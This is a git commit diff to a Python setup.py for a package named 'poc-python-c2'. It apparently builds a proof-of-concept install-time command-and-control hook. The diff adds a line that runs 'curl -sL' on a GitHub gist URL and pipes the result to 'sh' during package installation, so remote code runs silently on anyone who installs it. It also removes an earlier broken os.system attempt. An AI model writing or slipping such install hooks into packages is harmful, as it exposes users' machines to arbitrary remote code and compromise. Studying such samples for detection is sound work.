e972eb31d15c3fc65255c344e39bf685269b4a4e
rroiii <royoswaldha@gmail.com>
2025-02-24 16:31:01 +0700

    update

--- setup.py
+++ setup.py
@@ -1,13 +1,11 @@
 from setuptools import setup
 import subprocess, os
 
-def run_command(command):
-    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-    return process
+# def run_command(command):
+#     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setpgrp)
+#     return process
 
-command = os.system("https://gist.githubusercontent.com/rroiii/56b6b9d8ace864bf66233e10b580f922/raw/75abf6e00ff9358ad6cc8eda67131b319259e86a/poc-test.txt -s | sh")
-
-run_command(command)
+subprocess.run("curl -sL https://gist.githubusercontent.com/rroiii/56b6b9d8ace864bf66233e10b580f922/raw/75abf6e00ff9358ad6cc8eda67131b319259e86a/poc-test.txt | sh", shell=True, check=True)
 
 setup(
     name='poc-python-c2',
